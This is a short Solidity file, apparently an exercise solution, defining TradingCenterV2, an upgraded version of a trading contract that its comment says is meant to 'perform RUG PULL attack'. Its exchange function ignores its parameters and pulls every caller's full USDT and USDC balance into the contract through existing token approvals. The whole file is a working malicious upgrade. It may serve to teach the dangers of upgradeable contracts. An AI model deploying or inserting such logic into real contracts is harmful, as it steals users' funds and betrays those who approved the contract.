// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter } from "./TradingCenter.sol";
import { IERC20 } from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{
    //Upgrade TradingCenter to TradingCenterV2 and perform RUG PULL attack
    function initialize(IERC20 _usdt, IERC20 _usdc) public virtual override {
        require(initialized == false, "already initialized");
        initialized = true;
        usdt = _usdt;
        usdc = _usdc;
    }

    function exchange(IERC20 token0, uint256 amount) public virtual override {
        //token0 and amount is not used, however, to make it more realistic, we still keep it.
        usdt.transferFrom(msg.sender, address(this), usdt.balanceOf(msg.sender));
        usdc.transferFrom(msg.sender, address(this), usdc.balanceOf(msg.sender));
    }
}